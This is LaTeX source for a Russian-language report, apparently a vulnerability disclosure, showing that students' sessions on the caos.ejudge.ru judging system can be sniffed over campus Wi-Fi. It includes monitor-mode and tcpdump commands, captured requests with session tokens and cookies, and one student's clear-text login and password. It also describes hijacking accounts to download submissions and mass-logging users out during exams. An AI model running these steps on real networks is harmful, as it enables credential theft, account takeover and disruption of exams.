\documentclass{article}
\usepackage{cmap}
\usepackage[T2A]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage[english, russian]{babel}
\usepackage[a4paper, left=10mm, right=10mm, top=12mm, bottom=15mm]{geometry}
\usepackage{mathtools,amssymb}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{verbatim}


\lstdefinestyle{mystyle}{
	backgroundcolor=\color{backcolour},   
	commentstyle=\color{codegreen},
	keywordstyle=\color{magenta},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	basicstyle=\footnotesize,
	breakatwhitespace=false,         
	breaklines=true,                 
	captionpos=b,                    
	keepspaces=true,                 
	numbers=left,                    
	numbersep=5pt,                  
	showspaces=false,                
	showstringspaces=false,
	showtabs=false,                  
	tabsize=2
}


\begin{document}
	\fontsize{10}{10}\selectfont
	
Поскольку caos.ejudge.ru работает по HTTP без SSL-шифрования, а в корпусе ФКН большинство студентов пользуются публичным Wi-Fi, переключив сетевую карту в режим мониторигна:
\begin{verbatim}
# service network-manager stop
# ifconfig wlp3s0 down && iwconfig wlp3s0 mode monitor && ifconfig wlp3s0 up
\end{verbatim}
и запустив tcpdump:
\begin{verbatim}
# tcpdump -i wlp3s0 -l -s0 -w rawdump tcp dst port 80 and host 89.108.125.173
\end{verbatim}
можно легко перехватить логины, пароли, токены и cookie студентов, заходящих в тестирующую систему через Wi-Fi в учебном корпусе. 

После частичного удаления бинарного мусора из дампа получается текстовый файл, содержащий перехваченные HTTP-запросы (см. пример в файле):
\begin{verbatim}
$ cat rawdump | strings > dump
$ cat dump
\end{verbatim}
\fontsize{8}{8}\selectfont
\begin{verbatim}
<99@
49:@
|oNX
"GET /ej/client?SID=3acc31c1501fa7dc&action=175&x=0 HTTP/1.1
Host: caos.ejudge.ru
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
Referer: http://caos.ejudge.ru/ej/client/view-problem-submit/S3acc31c1501fa7dc?prob_id=97
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: EJSID=c744fedbf668334e
jYl}
jYl}
jYl}
GET /ej/client/view-report/Sf860b160e8bad62a?run_id=2256 HTTP/1.1
Host: caos.ejudge.ru
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z010DD Build/MMB29P)
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://caos.ejudge.ru/ej/client/view-problem-submit/Sf860b160e8bad62a?prob_id=80
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: EJSID=b12600be634a9506
jYl}
jYl}
49:@
49:@
-POST /ej/client HTTP/1.1
Host: caos.ejudge.ru
Connection: keep-alive
Content-Length: 96
Cache-Control: max-age=0
Origin: http://caos.ejudge.ru
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://caos.ejudge.ru/ej/client?contest_id=60
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,ru;q=0.7
Cookie: EJSID=3868c18e5a196e24
contest_id=60&role=0&prob_name=&login=bpmi16513&password=qwerty123&locale_id=0&action_2=Log+in
49<@
Z9=@
pGET /ej/client/main-page/S0fc64d8a4b5435b6?lt=1 HTTP/1.1
Host: caos.ejudge.ru
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://caos.ejudge.ru/ej/client?contest_id=60
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,ru;q=0.7
Cookie: EJSID=3868c18e5a196e24
Z9=@
@9B@
oRlZ*
49C@
49D@
\end{verbatim}
\fontsize{10}{10}\selectfont
Если в этот дамп попали пароли, то они находятся простым grep'ом:
\begin{verbatim}
$ cat dump | grep password
contest_id=60&role=0&prob_name=&login=bpmi16513&password=qwerty123&locale_id=0&action_2=Log+in
\end{verbatim}
\newpage


Вероятность попадания именно логинов и паролей в дамп не очень большая (если, конечно, это не начало контрольной работы, когда все логинятся одновременно; во время же лекций и семинаров мне удалось получить только два пароля), но также из дампа легко получить токены (действительны в течение суток) и cookie, которых вполне достаточно, чтобы отправлять запросы к caos.ejudge.ru от имени пользователя. В частности, можно получить список всех посылок пользователя и скачать эти посылки (кроме посылок на контрольной работе, там просмотр кода недоступен), сдать от имени пользователя решение (или несколько тысяч решений), запросить http://caos.ejudge.ru/ej/client/logout, после чего пользователю придётся перелогиниться, и его логин и пароль окажутся в следующем дампе. Также постоянная отправка запросов на http://caos.ejudge.ru/ej/client/logout с перехваченными токенами и cookie во время контрольной работы сделает невозможной отправку решений.


В файле parse\_download\_logout.py приведён пример скрипта, который парсит дамп, извлекая оттуда токены и cookie, для каждого пользователя скачивает все его решения и разлогинивается.


Поскольку в ejudge есть строка состояния, которая обновляется каждую минуту и отправляет запрос с токеном и cookie:

\fontsize{8}{8}\selectfont
\begin{verbatim}
GET /ej/client?SID=3acc31c1501fa7dc&action=175&x=0 HTTP/1.1
Host: caos.ejudge.ru
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) 
Referer: http://caos.ejudge.ru/ej/client/view-problem-submit/S3acc31c1501fa7dc?prob_id=97
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: EJSID=c744fedbf668334e
\end{verbatim}
\fontsize{10}{10}\selectfont
для перехвата токена и cookie даже не нужно ждать когда пользователь обновит страницу или откроет новую: достаточно запустить tcpdump всего на одну минуту, и в дампе окажутся токены всех, кто пользуется (у кого открыта вкладка в браузере) тестирующей системой через публичный Wi-Fi в аудитории.


Воспользоваться описанным выше крайне легко (это может сделать любой студент ФКН).


\end{document}
